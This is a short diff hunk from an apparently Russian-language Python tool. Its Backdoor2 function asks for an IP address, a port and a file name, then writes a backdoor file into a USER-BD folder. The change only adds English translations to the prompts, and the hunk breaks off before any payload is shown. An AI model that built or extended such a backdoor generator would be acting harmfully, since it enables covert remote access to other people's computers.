@@ -613,8 +613,8 @@ create_jobs() """)
 			print('\033[32mLook in the USER-BD folder')
 		def Backdoor2():
 			os.chdir('USER-BD')
-			ipy = input('\033[35mВведите свой IP')
-			pty = input('\033[35mВведите порт')
+			ipy = input('\033[35mВведите свой IP(Enter IP):')
+			pty = input('\033[35mВведите порт(Enter Port):')
 			q = str(input('\033[35mИмя файла вашего бэкдора(File name of your backdoor) (file.py):'))
 			a = open(q,"w",encoding='utf-8')
 			a.write("""
